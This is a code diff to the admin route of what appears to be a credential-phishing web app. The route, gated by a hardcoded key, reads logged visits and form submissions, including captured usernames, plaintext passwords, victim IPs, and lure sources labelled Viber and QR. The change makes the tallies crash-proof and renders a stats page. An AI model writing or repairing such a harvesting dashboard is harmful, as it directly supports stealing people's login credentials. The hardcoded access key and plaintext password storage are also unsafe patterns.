@@ -44,21 +44,44 @@ def admin():
     if key != 'texas2024':
         return '<h2 style="font-family:Arial;text-align:center;margin-top:100px">Access Denied</h2>', 403
 
-all_logs = supabase.table('logs').select('*').execute().data
-    total_visits   = sum(1 for r in all_logs if r['event'] == 'visit')
-    total_submits  = sum(1 for r in all_logs if r['event'] == 'submit')
-    viber_clicks   = sum(1 for r in all_logs if r['event'] == 'visit' and r['source'] == 'viber')
-    qr_clicks      = sum(1 for r in all_logs if r['event'] == 'visit' and r['source'] == 'qr')
-    mobile_submits = sum(1 for r in all_logs if r['event'] == 'submit' and r['device'] == 'mobile')
-    desktop_submits= sum(1 for r in all_logs if r['event'] == 'submit' and r['device'] == 'desktop')
+    # Get all logs safely
+    all_logs = supabase.table('logs').select('*').execute().data or []
 
-    submissions = [(r['timestamp'], r['username'], r['password'], r['source'], r['device'], r['ip'])
-                   for r in all_logs if r['event'] == 'submit']
-    submissions.sort(key=lambda x: x[0], reverse=True)
+    # Calculate stats safely (using .get() to avoid crashes)
+    total_visits = sum(1 for r in all_logs if r.get('event') == 'visit')
+    total_submits = sum(1 for r in all_logs if r.get('event') == 'submit')
+    viber_clicks = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'viber')
+    qr_clicks = sum(1 for r in all_logs if r.get('event') == 'visit' and r.get('source') == 'qr')
+    
+    # Comment these for now because 'device' column doesn't exist
+    mobile_submits = 0
+    desktop_submits = 0
+    # mobile_submits = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'mobile')
+    # desktop_submits = sum(1 for r in all_logs if r.get('event') == 'submit' and r.get('device') == 'desktop')
 
-    visits = [(r['timestamp'], r['source'], r['device'], r['ip'])
-              for r in all_logs if r['event'] == 'visit']
-    visits.sort(key=lambda x: x[0], reverse=True)
+    # Get submissions and visits
+    submissions = [
+        (r.get('timestamp'), r.get('username'), r.get('password'), 
+         r.get('source'), r.get('device'), r.get('ip'))
+        for r in all_logs if r.get('event') == 'submit'
+    ]
+    submissions.sort(key=lambda x: x[0] or '', reverse=True)
+
+    visits = [
+        (r.get('timestamp'), r.get('source'), r.get('device'), r.get('ip'))
+        for r in all_logs if r.get('event') == 'visit'
+    ]
+    visits.sort(key=lambda x: x[0] or '', reverse=True)
+
+    # TODO: Render your HTML template here with the variables
+    # For now, just return a simple message so the page loads
+    return f"""
+    <h2>Admin Panel</h2>
+    <p>Total Visits: {total_visits}</p>
+    <p>Total Submissions: {total_submits}</p>
+    <p>Viber Clicks: {viber_clicks}</p>
+    <p>QR Clicks: {qr_clicks}</p>
+    """, 200
 
     html = f'''<!DOCTYPE html>
 <html lang="en">
